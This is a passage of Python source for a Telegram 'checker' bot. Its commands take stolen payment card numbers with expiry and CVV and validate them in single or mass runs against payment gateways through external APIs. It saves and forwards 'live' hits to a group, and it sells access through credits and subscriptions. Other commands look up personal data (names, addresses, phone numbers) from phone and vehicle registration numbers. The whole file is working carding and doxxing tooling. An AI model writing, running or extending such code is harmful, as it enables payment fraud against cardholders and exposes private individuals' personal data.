                    'status': 'ERROR',
                    'card': formatted_cc,
                    'message': f'API Error: {response.status_code}',
                    'brand': brand,
                    'country': f"{country_name} {country_flag}",
                    'type': card_type,
                    'gateway': 'Braintree Auth 2'
                }
        except requests.exceptions.RequestException as e:
            error_msg = str(e)
            if "Read timed out" in error_msg:
                return {
                    'status': 'ERROR',
                    'card': formatted_cc,
                    'message': 'API Timeout (60s) - Server may be busy',
                    'brand': brand,
                    'country': f"{country_name} {country_flag}",
                    'type': card_type,
                    'gateway': 'Braintree Auth 2'
                }
            else:
                return {
                    'status': 'ERROR',
                    'card': formatted_cc,
                    'message': f'Request failed: {str(e)}',
                    'brand': brand,
                    'country': f"{country_name} {country_flag}",
                    'type': card_type,
                    'gateway': 'Braintree Auth 2'
                }
            
    except Exception as e:
        return {
            'status': 'ERROR',
            'card': cc,
            'message': f'Invalid Input: {str(e)}',
            'brand': 'UNKNOWN',
            'country': 'UNKNOWN 🌐',
            'type': 'UNKNOWN',
            'gateway': 'Braintree Auth 2'
        }
    

@bot.message_handler(commands=['bt'])
@bot.message_handler(func=lambda m: m.text and m.text.startswith('.bt'))
def handle_bt(message):
    # Check if user is allowed to use in DMs
    if message.chat.type == 'private' and str(message.from_user.id) not in ADMIN_IDS and not is_user_subscribed(message.from_user.id):
        bot.reply_to(message, "❌ This bot is restricted to use in DMs. You can freely use it in our group @stormxvup or subscribe to use in DMs.")
        return
    elif message.chat.type != 'private' and str(message.chat.id) not in APPROVED_GROUPS:
        bot.reply_to(message, "❌ This group is not approved to use this bot.")
        return

    if not confirm_time():
        bot.reply_to(message, "❌ The checker is dead now, follow @Darkboy336 for more!!")
        return

    # Check flood control for non-subscribed users
    if not is_user_subscribed(message.from_user.id) and not check_flood_control(message.from_user.id):
        bot.reply_to(message, "⏳ Please wait 5 seconds between commands. Buy a plan to remove this limit.")
        return

    # Check credits for non-subscribed users
    if not is_user_subscribed(message.from_user.id):
        if not check_user_credits(message.from_user.id, 1):
            remaining = get_remaining_credits(message.from_user.id)
            bot.reply_to(message, f"❌ You've used all your daily credits ({DAILY_CREDITS}). Remaining: {remaining}. Subscribe or wait for daily reset.")
            return
        deduct_credits(message.from_user.id, 1)

    try:
        # Extract card from either format
        cc = None
        
        # Check if command is empty (either '/bt' or '.bt' without arguments)
        if (message.text.startswith('/bt') and len(message.text.split()) == 1) or \
           (message.text.startswith('.bt') and len(message.text.strip()) == 3):
            
            # Check if this is a reply to another message
            if message.reply_to_message:
                # Search for CC in replied message text
                replied_text = message.reply_to_message.text
                # Try to find CC in common formats
                cc_pattern = r'\b(?:\d[ -]*?){13,16}\b'
                matches = re.findall(cc_pattern, replied_text)
                if matches:
                    # Clean the CC (remove spaces and dashes)
                    cc = matches[0].replace(' ', '').replace('-', '')
                    # Check if we have full card details (number|mm|yyyy|cvv)
                    details_pattern = r'(\d+)[\|/](\d+)[\|/](\d+)[\|/](\d+)'
                    details_match = re.search(details_pattern, replied_text)
                    if details_match:
                        cc = f"{details_match.group(1)}|{details_match.group(2)}|{details_match.group(3)}|{details_match.group(4)}"
        else:
            # Normal processing for commands with arguments
            if message.text.startswith('/'):
                parts = message.text.split()
                if len(parts) < 2:
                    bot.reply_to(message, "❌ Invalid format. Use /bt CC|MM|YYYY|CVV or .bt CC|MM|YYYY|CVV")
                    return
                cc = parts[1]
            else:  # starts with .
                cc = message.text[4:].strip()  # remove ".bt "

        if not cc:
            bot.reply_to(message, "❌ No card found. Either provide CC details after command or reply to a message containing CC details.")
            return

        start_time = time.time()

        user_full_name = message.from_user.first_name
        if message.from_user.last_name:
            user_full_name += " " + message.from_user.last_name

        status_msg = bot.reply_to(
            message,
            "↯ Checking..\n\n⌯ 𝐂𝐚𝐫𝐝 - <code>{}</code>\n⌯ 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 -  <i>Braintree Auth 2</i> \n⌯ 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 - <i>Processing</i>".format(cc),
            parse_mode='HTML'
        )

        def check_card():
            try:
                result = check_bt_cc(cc)
                result['user_id'] = message.from_user.id  # Added line to include user ID
                processing_time = time.time() - start_time
                response_text = format_single_response(result, user_full_name, processing_time)

                # Edit original message
                bot.edit_message_text(chat_id=message.chat.id,
                                    message_id=status_msg.message_id,
                                    text=response_text,
                                    parse_mode='HTML')

                # Auto-send approved results to hits group
                try:
                    if any(keyword in response_text.upper() for keyword in ["APPROVED", "CHARGED", "LIVE"]):
                        bot.send_message(HITS_GROUP_ID, response_text, parse_mode="HTML")
                except Exception as e:
                    print(f"[Auto Forward Error - bt] {e}")

            except Exception as e:
                bot.edit_message_text(chat_id=message.chat.id,
                                    message_id=status_msg.message_id,
                                    text=f"❌ An error occurred: {str(e)}")

        threading.Thread(target=check_card).start()

    except Exception as e:
        bot.reply_to(message, f"❌ Error: {str(e)}")


# Handle both /mbt and .mbt
@bot.message_handler(commands=['mbt'])
@bot.message_handler(func=lambda m: m.text and m.text.startswith('.mbt'))
def handle_mbt(message):
    # Check if user is allowed to use in DMs
    if message.chat.type == 'private' and str(message.from_user.id) not in ADMIN_IDS and not is_user_subscribed(message.from_user.id):
        bot.reply_to(message, "❌ This bot is restricted to use in DMs. You can freely use it in our group @stormxvup or subscribe to use in DMs.")
        return
    elif message.chat.type != 'private' and str(message.chat.id) not in APPROVED_GROUPS:
        bot.reply_to(message, "❌ This group is not approved to use this bot.")
        return
    
    if not confirm_time():
        bot.reply_to(message, "❌ The checker is dead now, follow @Darkboy336 for more!!")
        return
    
    # Check if user is subscribed
    if not is_user_subscribed(message.from_user.id):
        bot.reply_to(message, "❌ This command is only for subscribed users. Buy a plan to use this feature.")
        return
    
    # Check mass check cooldown
    if not check_mass_check_cooldown(message.from_user.id):
        bot.reply_to(message, "⚠️ You are doing things too fast! Please wait 20 seconds between mass checks.")
        return
    
    try:
        cards_text = None
        command_parts = message.text.split()
        
        # Check if cards are provided after command
        if len(command_parts) > 1:
            cards_text = ' '.join(command_parts[1:])
        elif message.reply_to_message:
            cards_text = message.reply_to_message.text
        else:
            bot.reply_to(message, "❌ Please provide cards after command or reply to a message containing cards.")
            return
            
        cards = []
        for line in cards_text.split('\n'):
            line = line.strip()
            if line:
                for card in line.split():
                    if '|' in card:
                        cards.append(card.strip())
        
        if not cards:
            bot.reply_to(message, "❌ No valid cards found in the correct format (CC|MM|YYYY|CVV).")
            return
        
        # Determine max limit based on subscription status
        max_limit = MAX_SUBSCRIBED_CARDS_LIMIT if is_user_subscribed(message.from_user.id) else MAX_CARDS_LIMIT
        
        if len(cards) > max_limit:
            cards = cards[:max_limit]
            bot.reply_to(message, f"⚠️ Maximum {max_limit} cards allowed. Checking first {max_limit} cards only.")
        
        start_time = time.time()
            
        user_full_name = message.from_user.first_name
        if message.from_user.last_name:
            user_full_name += " " + message.from_user.last_name
            
        status_msg = bot.reply_to(message, f"↯ Checking {len(cards)} cards...", parse_mode='HTML')
        
        def check_cards():
            try:
                results = []
                for i, card in enumerate(cards, 1):
                    try:
                        result = check_bt_cc(card)
                        results.append(result)
                        
                        processing_time = time.time() - start_time
                        response_text = format_mchk_response(results, len(cards), processing_time, i)
                        bot.edit_message_text(chat_id=message.chat.id,
                                            message_id=status_msg.message_id,
                                            text=response_text,
                                            parse_mode='HTML')
                    except Exception as e:
                        results.append({
                            'status': 'ERROR',
                            'card': card,
                            'message': f'Invalid: {str(e)}',
                            'brand': 'UNKNOWN',
                            'country': 'UNKNOWN 🌐',
                            'type': 'UNKNOWN',
                            'gateway': 'Braintree Auth 2'
                        })
                        processing_time = time.time() - start_time
                        response_text = format_mchk_response(results, len(cards), processing_time, i)
                        bot.edit_message_text(chat_id=message.chat.id,
                                            message_id=status_msg.message_id,
                                            text=response_text,
                                            parse_mode='HTML')
                
                processing_time = time.time() - start_time
                response_text = format_mchk_response(results, len(cards), processing_time)
                bot.edit_message_text(chat_id=message.chat.id,
                                    message_id=status_msg.message_id,
                                    text=response_text,
                                    parse_mode='HTML')
            
            except Exception as e:
                bot.edit_message_text(chat_id=message.chat.id,
                                     message_id=status_msg.message_id,
                                     text=f"❌ An error occurred: {str(e)}",
                                     parse_mode='HTML')
        
        threading.Thread(target=check_cards).start()
    
    except Exception as e:
        bot.reply_to(message, f"❌ An error occurred: {str(e)}")

def check_rn_cc(cc):
    try:
        # Normalize input format (accept various separators and formats)
        card = cc.replace('/', '|').replace(' ', '|').replace(':', '|')
        lista = [part.strip() for part in card.split('|') if part.strip()]
        
        # Validate we have all required parts
        if len(lista) < 4:
            return {
                'status': 'ERROR',
                'card': cc,
                'message': 'Invalid format. Use CC|MM|YYYY|CVV',
                'brand': 'UNKNOWN',
                'country': 'UNKNOWN 🌐',
                'type': 'UNKNOWN',
                'gateway': 'Render.com'
            }
        
        cc_num = lista[0]
        mm = lista[1].zfill(2)  # Ensure 2-digit month (e.g., 3 becomes 03)
        yy_raw = lista[2]
        cvv = lista[3]
        
        # Normalize year to 4 digits - FIXED LOGIC
        if len(yy_raw) == 2:  # 2-digit year provided
            current_year_short = datetime.now().year % 100
            input_year = int(yy_raw)
            if input_year >= current_year_short - 10:  # Consider years within 10 years range
                yy = '20' + yy_raw  # 22 → 2022
            else:
                yy = '20' + yy_raw  # Default to 20xx for all 2-digit years
        elif len(yy_raw) == 4:  # 4-digit year provided
            yy = yy_raw
        else:
            return {
                'status': 'ERROR',
                'card': cc,
                'message': 'Invalid year format (use YY or YYYY)',
                'brand': 'UNKNOWN',
                'country': 'UNKNOWN 🌐',
                'type': 'UNKNOWN',
                'gateway': 'Render.com'
            }
        
        # Validate card number length
        if not (13 <= len(cc_num) <= 19):
            return {
                'status': 'ERROR',
                'card': cc,
                'message': 'Invalid card number length',
                'brand': 'UNKNOWN',
                'country': 'UNKNOWN 🌐',
                'type': 'UNKNOWN',
                'gateway': 'Render.com'
            }
        
        # Validate month
        if not (1 <= int(mm) <= 12):
            return {
                'status': 'ERROR',
                'card': cc,
                'message': 'Invalid month (1-12)',
                'brand': 'UNKNOWN',
                'country': 'UNKNOWN 🌐',
                'type': 'UNKNOWN',
                'gateway': 'Render.com'
            }
        
        # Validate CVV
        if not (3 <= len(cvv) <= 4):
            return {
                'status': 'ERROR',
                'card': cc,
                'message': 'Invalid CVV length',
                'brand': 'UNKNOWN',
                'country': 'UNKNOWN 🌐',
                'type': 'UNKNOWN',
                'gateway': 'Render.com'
            }
        
        # Check expiration (using normalized values)
        current_year = datetime.now().year
        current_month = datetime.now().month
        
        if int(yy) < current_year or (int(yy) == current_year and int(mm) < current_month):
            return {
                'status': 'DECLINED',
                'card': f"{cc_num}|{mm}|{yy}|{cvv}",
                'message': 'Your card is expired',
                'brand': 'UNKNOWN',
                'country': 'UNKNOWN 🌐',
                'type': 'UNKNOWN',
                'gateway': 'Render.com'
            }
        
        # Get BIN info
        bin_info = None
        try:
            bin_response = requests.get(f"https://bins.antipublic.cc/bins/{cc_num[:6]}", timeout=5)
            if bin_response.status_code == 200:
                bin_info = bin_response.json()
        except:
            pass
            
        # Set default values if BIN lookup failed
        brand = bin_info.get('brand', 'UNKNOWN') if bin_info else 'UNKNOWN'
        country_name = bin_info.get('country_name', 'UNKNOWN') if bin_info else 'UNKNOWN'
        country_flag = bin_info.get('country_flag', '🌐') if bin_info else '🌐'
        card_type = bin_info.get('type', 'UNKNOWN') if bin_info else 'UNKNOWN'
        bank = bin_info.get('bank', 'UNKNOWN') if bin_info else 'UNKNOWN'
        
        # Prepare card for API - in perfect CC|MM|YYYY|CVV format
        formatted_cc = f"{cc_num}|{mm}|{yy}|{cvv}"
        
        try:
            headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
                'Accept': 'application/json',
                'Connection': 'keep-alive'
            }
            
            # Increased timeout to 60 seconds
            response = requests.get(RN_API_URL.format(formatted_cc), headers=headers, timeout=300)
            
            if response.status_code == 200:
                try:
                    data = response.json()
                except json.JSONDecodeError:
                    return {
                        'status': 'ERROR',
                        'card': formatted_cc,
                        'message': 'Invalid API response',
                        'brand': brand,
                        'country': f"{country_name} {country_flag}",
                        'type': card_type,
                        'gateway': 'Render.com'
                    }
                    
                status = data.get('status', 'Declined ❌')
                message = data.get('response', 'Your card was declined.')
                
                # Improved status detection
                if any(word in status for word in ['Live', 'Approved', 'APPROVED', 'Success']):
                    status = 'APPROVED'
                    with open('HITS.txt','a') as hits:
                        hits.write(formatted_cc+'\n')
                    return {
                        'status': 'APPROVED',
                        'card': formatted_cc,
                        'message': message,
                        'brand': brand,
                        'country': f"{country_name} {country_flag}",
                        'type': card_type,
                        'gateway': 'Render.com'
                    }
                elif any(word in status for word in ['Declined', 'Decline', 'Failed', 'Error']):
                    return {
                        'status': 'DECLINED',
                        'card': formatted_cc,
                        'message': message,
                        'brand': brand,
                        'country': f"{country_name} {country_flag}",
                        'type': card_type,
                        'gateway': 'Render.com'
                    }
                else:
                    return {
                        'status': 'ERROR',
                        'card': formatted_cc,
                        'message': 'Unknown response from API',
                        'brand': brand,
                        'country': f"{country_name} {country_flag}",
                        'type': card_type,
                        'gateway': 'Render.com'
                    }
            else:
                return {
                    'status': 'ERROR',
                    'card': formatted_cc,
                    'message': f'API Error: {response.status_code}',
                    'brand': brand,
                    'country': f"{country_name} {country_flag}",
                    'type': card_type,
                    'gateway': 'Render.com'
                }
        except requests.exceptions.RequestException as e:
            error_msg = str(e)
            if "Read timed out" in error_msg:
                return {
                    'status': 'ERROR',
                    'card': formatted_cc,
                    'message': 'API Timeout (60s) - Server may be busy',
                    'brand': brand,
                    'country': f"{country_name} {country_flag}",
                    'type': card_type,
                    'gateway': 'Render.com'
                }
            else:
                return {
                    'status': 'ERROR',
                    'card': formatted_cc,
                    'message': f'Request failed: {str(e)}',
                    'brand': brand,
                    'country': f"{country_name} {country_flag}",
                    'type': card_type,
                    'gateway': 'Render.com'
                }
            
    except Exception as e:
        return {
            'status': 'ERROR',
            'card': cc,
            'message': f'Invalid Input: {str(e)}',
            'brand': 'UNKNOWN',
            'country': 'UNKNOWN 🌐',
            'type': 'UNKNOWN',
            'gateway': 'Render.com'
        }
    

# Handle both /b3 and .b3
@bot.message_handler(commands=['rn'])
@bot.message_handler(func=lambda m: m.text and m.text.startswith('.rn'))
def handle_rn(message):
    # Check if user is allowed to use in DMs
    if message.chat.type == 'private' and str(message.from_user.id) not in ADMIN_IDS and not is_user_subscribed(message.from_user.id):
        bot.reply_to(message, "❌ This bot is restricted to use in DMs. You can freely use it in our group @stormxvup or subscribe to use in DMs.")
        return
    elif message.chat.type != 'private' and str(message.chat.id) not in APPROVED_GROUPS:
        bot.reply_to(message, "❌ This group is not approved to use this bot.")
        return

    if not confirm_time():
        bot.reply_to(message, "❌ The checker is dead now, follow @Darkboy336 for more!!")
        return

    # Check flood control for non-subscribed users
    if not is_user_subscribed(message.from_user.id) and not check_flood_control(message.from_user.id):
        bot.reply_to(message, "⏳ Please wait 5 seconds between commands. Buy a plan to remove this limit.")
        return

    # Check credits for non-subscribed users
    if not is_user_subscribed(message.from_user.id):
        if not check_user_credits(message.from_user.id, 1):
            remaining = get_remaining_credits(message.from_user.id)
            bot.reply_to(message, f"❌ You've used all your daily credits ({DAILY_CREDITS}). Remaining: {remaining}. Subscribe or wait for daily reset.")
            return
        deduct_credits(message.from_user.id, 1)

    try:
        # Extract card from either format
        if message.text.startswith('/'):
            parts = message.text.split()
            if len(parts) < 2:
                bot.reply_to(message, "❌ Invalid format. Use /py CC|MM|YYYY|CVV or .py CC|MM|YYYY|CVV")
                return
            cc = parts[1]
        else:  # starts with .
            cc = message.text[4:].strip()  # remove ".b3 "

        start_time = time.time()

        user_full_name = message.from_user.first_name
        if message.from_user.last_name:
            user_full_name += " " + message.from_user.last_name

        status_msg = bot.reply_to(
            message,
            "↯ Checking..\n\n⌯ 𝐂𝐚𝐫𝐝 - <code>{}</code>\n⌯ 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 -  <i>Render.com </i> \n⌯ 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 - <i>Processing</i>".format(cc),
            parse_mode='HTML'
        )

        def check_card():
            try:
                result = check_rn_cc(cc)
                result['user_id'] = message.from_user.id  # Added line to include user ID
                processing_time = time.time() - start_time
                response_text = format_single_response(result, user_full_name, processing_time)

                # Edit original message
                bot.edit_message_text(chat_id=message.chat.id,
                                      message_id=status_msg.message_id,
                                      text=response_text,
                                      parse_mode='HTML')

                # Auto-send approved results to hits group
                try:
                    if any(keyword in response_text.upper() for keyword in ["APPROVED", "CHARGED", "LIVE"]):
                        bot.send_message(HITS_GROUP_ID, response_text, parse_mode="HTML")
                except Exception as e:
                    print(f"[Auto Forward Error - rn] {e}")

            except Exception as e:
                bot.edit_message_text(chat_id=message.chat.id,
                                      message_id=status_msg.message_id,
                                      text=f"❌ An error occurred: {str(e)}")

        threading.Thread(target=check_card).start()

    except Exception as e:
        bot.reply_to(message, f"❌ Error: {str(e)}")

import re
import requests
import traceback

# --- CONTEXT CHECKER ---
def is_group_approved(chat_id):
    return str(chat_id) in [str(g) for g in APPROVED_GROUPS]

def ensure_allowed_context(message):
    user_id = message.from_user.id
    uid_str = str(user_id)
    chat = message.chat
    if chat.type == "private":
        if not is_user_subscribed(user_id) and uid_str not in ADMIN_IDS:
            bot.reply_to(message, "⛔ This command works only for subscribed users in private chat. Please subscribe first.")
            return False
    else:
        if not is_group_approved(chat.id):
            return False
    return True

def is_admin_or_owner(user_id):
    uid = str(user_id)
    return uid == "7820713047" or uid in ADMIN_IDS

# --- SERVICE CREDIT SYSTEM (per service: ph, vh, rc) ---
CREDITS_PATH = "service_credits"

def read_service_credits():
    try:
        v = read_firebase(CREDITS_PATH)
        return v or {}
    except:
        return {}

def write_service_credits(data):
    try:
        url = f"{FIREBASE_BASE_URL}/{CREDITS_PATH}.json"
        requests.put(url, json=data)
    except:
        pass

def get_service_credit_balance(user_id, service):
    user_id_str = str(user_id)
    if is_admin_or_owner(user_id):
        return float("inf")
    all_credits = read_service_credits()
    user_record = all_credits.get(user_id_str, {})
    default = 20 if is_user_subscribed(user_id) else 5
    if service not in user_record:
        user_record[service] = default
        all_credits[user_id_str] = user_record
        write_service_credits(all_credits)
    return user_record.get(service, default)

def deduct_service_credit(user_id, service, amount=1):
    user_id_str = str(user_id)
    if is_admin_or_owner(user_id):
        return
    all_credits = read_service_credits()
    user_record = all_credits.get(user_id_str, {})
    if service not in user_record:
        user_record[service] = 20 if is_user_subscribed(user_id) else 5
    user_record[service] = max(0, user_record[service] - amount)
    all_credits[user_id_str] = user_record
    write_service_credits(all_credits)

def remaining_credit_display(user_id, service):
    rem = get_service_credit_balance(user_id, service)
    return "∞" if rem == float("inf") else str(rem)

# --- FORMATTERS ---
def format_ph_response(json_data):
    lines = []
    success = json_data.get("success", False)
    requested = json_data.get("requested_number", "N/A")
    lines.append("📱 <b>Phone Lookup Result</b>")
    lines.append(f"🆔 Requested Number: <code>{requested}</code>")
    lines.append(f"✅ Success: {success}")
    data = json_data.get("data", {})

    primary = data.get("Requested Number Results", [])
    if primary:
        for idx, entry in enumerate(primary, 1):
            lines.append(f"\n<b>Primary Result #{idx}</b>")
            for k, v in entry.items():
                value = v if v else "N/A"
                lines.append(f"{k}: <code>{value}</code>")
    else:
        lines.append("\n<b>No primary result found.</b>")

    alt_search = data.get("Also searched full data on Alt Numbers", [])
    if alt_search:
        for alt in alt_search:
            alt_num = alt.get("Alt Number", "N/A")
            lines.append(f"\n🔁 <b>Also searched on alt number:</b> <code>{alt_num}</code>")
            results = alt.get("Results", [])
            if results:
                for idx, entry in enumerate(results, 1):
                    lines.append(f"  └─ <b>Alt Result #{idx}</b>")
                    for k, v in entry.items():
                        value = v if v else "N/A"
                        lines.append(f"     {k}: <code>{value}</code>")
            else:
                lines.append("  └─ No results for this alt number.")
    return "\n".join(lines)

def format_vh_response(json_data):
    lines = []
    status = json_data.get("status", "N/A")
    vehicle_number = json_data.get("vehicle_number", "N/A")
    lines.append("🚘 <b>Vehicle Lookup Result</b>")
    lines.append(f"🆔 Vehicle Number: <code>{vehicle_number}</code>")
    lines.append(f"📊 Status: {status}")

    details = json_data.get("vehicle_details", [])
    if details:
        for entry in details:
            for k, v in entry.items():
                display_value = v
                if isinstance(v, list):
                    display_value = ", ".join(str(x) for x in v)
                elif isinstance(v, bool):
                    display_value = "Yes" if v else "No"
                lines.append(f"{k}: <code>{display_value}</code>")
    else:
        lines.append("⚠️ No vehicle details found.")
    return "\n".join(lines)

def format_rc_response(json_data):
    lines = []
    rc_num = json_data.get("rc_number", "N/A")
    owner = json_data.get("owner_name", "N/A")
    father = json_data.get("father_name") or "N/A"
    owner_serial = json_data.get("owner_serial_no", "N/A")
    vehicle_class = json_data.get("vehicle_class", "N/A")
    fuel_type = json_data.get("fuel_type", "N/A")
    fuel_norms = json_data.get("fuel_norms", "N/A")
    reg_date = json_data.get("registration_date", "N/A")
    insurance_company = json_data.get("insurance_company", "N/A")
    insurance_expiry = json_data.get("insurance_expiry", "N/A")
    fitness = json_data.get("fitness_upto", "N/A")
    financier = json_data.get("financier_name", "N/A")
    rto = json_data.get("rto", "N/A")
    address = json_data.get("address", "N/A")
    city = json_data.get("city", "N/A")
    phone = json_data.get("phone", "N/A")
    owner_flag = json_data.get("owner", "")

    lines.append("🪪 <b>RC Lookup Result</b>")
    lines.append(f"🆔 RC Number: <code>{rc_num}</code>")
    lines.append(f"👤 Owner Name: <code>{owner}</code>")
    lines.append(f"👨‍👦 Father Name: <code>{father}</code>")
    lines.append(f"🧾 Owner Serial: <code>{owner_serial}</code>")
    lines.append(f"🚗 Vehicle Class: <code>{vehicle_class}</code>")
    lines.append(f"⛽ Fuel Type: <code>{fuel_type}</code>")
    lines.append(f"⚙️ Fuel Norms: <code>{fuel_norms}</code>")
    lines.append(f"📅 Registration Date: <code>{reg_date}</code>")
    lines.append(f"🏢 Insurance Company: <code>{insurance_company}</code>")
    lines.append(f"📅 Insurance Expiry: <code>{insurance_expiry}</code>")
    lines.append(f"📅 Fitness Upto: <code>{fitness}</code>")
    lines.append(f"💼 Financier: <code>{financier}</code>")
    lines.append(f"🏛 RTO: <code>{rto}</code>")
    lines.append(f"📍 Address: <code>{address}</code>")
    lines.append(f"🌆 City: <code>{city}</code>")
    lines.append(f"📞 Phone: <code>{phone}</code>")
    if owner_flag:
        lines.append(f"🏷 Owner Flag: <code>{owner_flag}</code>")
    return "\n".join(lines)

# --- GENERIC LOOKUP HANDLER ---
def handle_generic_lookup(message, service, build_url_fn, formatter_fn, usage_example, success_check):
    if not ensure_allowed_context(message):
        return

    user_id = message.from_user.id
    parts = message.text.strip().split()
    if len(parts) != 2:
        bot.reply_to(message, f"❌ Invalid format. Use: {usage_example}")
        return

    query = parts[1].strip()
    if service == "ph":
        lookup_value = re.sub(r'\D', '', query)
        if not re.fullmatch(r'\d{10}', lookup_value):
            bot.reply_to(message, "❌ Phone must be exactly 10 digits. Example: /ph 7582060560")
            return
    else:
        lookup_value = query.upper()

    balance = get_service_credit_balance(user_id, service)
    if balance == 0:
        cap = 20 if is_user_subscribed(user_id) else 5
        bot.reply_to(message, f"⚠️ You have used your {cap} free {service.upper()} lookup credits. Use /buy to get more or renew subscription.")
        return

    status_msg = bot.send_message(message.chat.id, "Getting details, please wait...")
    deduct_service_credit(user_id, service, 1)

    try:
        url = build_url_fn(lookup_value)
        resp = requests.get(url, timeout=15)
        if resp.status_code != 200:
            bot.edit_message_text(chat_id=message.chat.id, message_id=status_msg.message_id,
                                  text="❌ Lookup service returned an error. Please try again later.")
            print(f"[{service}] HTTP error {resp.status_code} for {lookup_value}")
            return

        try:
            data = resp.json()
        except Exception:
            bot.edit_message_text(chat_id=message.chat.id, message_id=status_msg.message_id,
                                  text="❌ Unexpected response format from lookup service. Please try again later.")
            print(f"[{service}] JSON parse error for {lookup_value}: {traceback.format_exc()}")
            return

        if not success_check(data):
            if service == "ph":
                bot.edit_message_text(chat_id=message.chat.id, message_id=status_msg.message_id,
                                      text="❌ Data Not Found. Try another number.")
            elif service == "vh":
                bot.edit_message_text(chat_id=message.chat.id, message_id=status_msg.message_id,
                                      text="❌ Vehicle data not found or invalid.")
            elif service == "rc":
                bot.edit_message_text(chat_id=message.chat.id, message_id=status_msg.message_id,
                                      text="❌ RC data not found or invalid.")
            return

        formatted = formatter_fn(data)
        rem_display = remaining_credit_display(user_id, service)
        formatted += f"\n\n💠 Remaining /{service} Credits: <b>{rem_display}</b>"

        bot.edit_message_text(chat_id=message.chat.id, message_id=status_msg.message_id,
                              text=formatted, parse_mode='HTML', disable_web_page_preview=True)
    except requests.exceptions.ConnectTimeout:
        bot.edit_message_text(chat_id=message.chat.id, message_id=status_msg.message_id,
                              text="❌ Network timeout when contacting lookup service. Try again in a moment.")
        print(f"[{service}] ConnectTimeout for {lookup_value}")
    except requests.exceptions.RequestException as e:
        bot.edit_message_text(chat_id=message.chat.id, message_id=status_msg.message_id,
                              text="❌ Lookup service temporarily unavailable. Please try again later.")
        print(f"[{service}] RequestException for {lookup_value}: {repr(e)}")
    except Exception:
        bot.edit_message_text(chat_id=message.chat.id, message_id=status_msg.message_id,
                              text="❌ An unexpected error occurred. Please try again later.")
        print(f"[{service}] Unexpected error for {lookup_value}: {traceback.format_exc()}")

# --- COMMANDS ---
@bot.message_handler(func=lambda m: m.text and re.match(r'^/ph\b', m.text.strip().lower()))
def ph_command(message):
    def build_ph_url(val):
        return f"https://glonova.in/Hajacode.php/?num={val}"
    handle_generic_lookup(
        message=message,
        service="ph",
        build_url_fn=build_ph_url,
        formatter_fn=format_ph_response,
        usage_example="/ph <10digitphonenumber>",
        success_check=lambda d: d.get("success", False)
    )

@bot.message_handler(func=lambda m: m.text and re.match(r'^/vh\b', m.text.strip().lower()))
def vh_command(message):
    def build_vh_url(val):
        # Updated vehicle lookup API endpoint
        return f"https://vehicle-info-api.herokuapp.com/vehicle?number={val}"
    
    def vh_success_check(data):
        return data.get("status", "").lower() == "success" and bool(data.get("data"))
    
    handle_generic_lookup(
        message=message,
        service="vh",
        build_url_fn=build_vh_url,
        formatter_fn=format_vh_response,
        usage_example="/vh <vehiclenumber> (e.g., /vh UP32NC5200)",
        success_check=vh_success_check
    )

@bot.message_handler(func=lambda m: m.text and re.match(r'^/rc\b', m.text.strip().lower()))
def rc_command(message):
    def build_rc_url(val):
        # Updated RC lookup API endpoint
        return f"https://rc-info-api.herokuapp.com/rc?number={val}"
    
    def rc_success_check(data):
        return bool(data.get("rc_number")) and data.get("status", "").lower() == "success"
    
    handle_generic_lookup(
        message=message,
        service="rc",
        build_url_fn=build_rc_url,
        formatter_fn=format_rc_response,
        usage_example="/rc <rcnumber> (e.g., /rc JK04F1806)",
        success_check=rc_success_check
    )


# Start the bot
if __name__ == "__main__":
    print("✦ 𝑺𝒕𝒐𝒓𝒎 ✗ 𝘾𝙝𝙚𝙘𝙠𝙚𝙧 𖤐 is running...")

    # Start the bot
    bot.infinity_polling()
